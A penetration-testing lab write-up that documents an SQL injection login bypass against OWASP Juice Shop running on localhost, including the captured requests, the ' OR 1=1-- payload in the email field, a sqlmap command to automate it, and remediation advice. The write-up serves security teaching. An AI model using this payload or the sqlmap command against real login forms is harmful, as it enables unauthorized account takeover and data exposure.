# 02 — SQL injection: login bypass

| | |
|---|---|
| **Target** | OWASP Juice Shop login @ `http://localhost:3000/#/login` (own lab) |
| **Authorization** | Own lab — see repo scope |
| **Class** | OWASP A03:2021 — Injection (SQLi) |
| **Tools** | Browser, Burp Suite, sqlmap |
| **Date** | 2026-06-22 |

## 1. Recon

The login form POSTs credentials to the REST API. Captured in Burp:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"test"}
```

The `email` field is reflected into a SQL query server-side — the classic SQLi
sink.

## 2. Vulnerability

The login query is built by **string concatenation** of the `email` value
instead of a parameterized statement, roughly:

```sql
SELECT * FROM Users
WHERE email = '<email>' AND password = '<hash>' AND deletedAt IS NULL;
```

Because `<email>` is not escaped, an attacker can break out of the string
literal and rewrite the query's logic.

## 3. Exploitation

Inject a payload in the `email` field that always evaluates true and comments
out the rest of the query:

```http
POST /rest/user/login HTTP/1.1
Content-Type: application/json

{"email":"' OR 1=1--","password":"anything"}
```

The query becomes `... WHERE email = '' OR 1=1-- ' AND password = ...`, so the
`AND password` check is commented out. The first user in the table (the admin)
is returned, and the API responds with a valid auth token — logged in as
**admin** without a password.

To confirm/automate from Kali:

```bash
sqlmap -u "http://localhost:3000/rest/user/login" \
  --method POST --data '{"email":"x","password":"x"}' \
  --headers="Content-Type: application/json" \
  -p email --batch --technique=B
```

> _evidence: ./assets/02-sqli-admin-token.png_

## 4. Impact

- **Authentication bypass** — log in as any user, including admin.
- **Data exposure** — with admin context, access to other users' data/orders.
- Foothold for further injection (UNION-based extraction of the users table).

This is critical: full account takeover from an unauthenticated request.

## 5. Remediation

- **Code fix:** never concatenate input into SQL. Use **parameterized queries /
  an ORM with bound parameters** so `email` is always treated as data:
  ```js
  // bound parameter — input can never alter query structure
  models.User.findOne({ where: { email, password: hash(password) } });
  ```
- **Shift-left (project #2):** **Semgrep** flags string-built SQL in the `sast`
  stage; **ZAP** (`dynamic-scan`) flags the injection at runtime — both gate the
  build before such code ships.
- **Platform control (project #1):** a WAF / ingress rule and least-privilege DB
  creds limit blast radius; network policy stops post-exploit egress.
- **Defense in depth:** parameterize (primary) + input validation + WAF +
  monitoring — no single layer is the whole answer.

## References

- OWASP Juice Shop — Injection challenges
- PortSwigger Web Security Academy — SQL injection
- OWASP A03:2021 — Injection; OWASP SQL Injection Prevention Cheat Sheet
